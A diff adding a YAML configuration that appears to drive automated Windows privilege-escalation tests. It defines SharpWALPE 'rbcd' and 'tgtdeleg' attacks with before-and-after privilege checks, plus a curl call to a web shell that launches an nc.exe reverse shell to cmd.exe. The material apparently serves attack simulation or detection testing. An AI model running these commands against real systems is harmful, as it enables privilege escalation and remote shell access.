@@ -1,0 +1,16 @@
+- att_name: "rbcd"
+  att_cmd: ".\\SharpWALPE.exe rbcd -m NEWCOMPUTER -p pAssw0rd -c"
+  cred_cmd: "whoami /user /priv"
+  cred_dir: "%cwd%"
+  cred_file_pre: "rbcd_pre.txt"
+  cred_file_aft: "rbcd_aft.txt"
+- att_name: "tgtdeleg"
+  att_cmd: "C:\\Users\\Public\\SharpWALPE.exe tgtdeleg -c"
+  cred_cmd: "whoami /user /priv"
+  cred_dir: "C:\\Users\\Public"
+  cred_file_pre: "tgtdeleg_pre.txt"
+  cred_file_aft: "tgtdeleg_aft.txt"
+  rem_att:
+    remcon_port: "2333"
+    remcon_cmd: "curl http://127.0.0.1/shell.asp?command=C%3A%5CUsers%5CPublic%5Cnc.exe+127.0.0.1+2333+-e+cmd.exe"
+    remcon_delay: 3
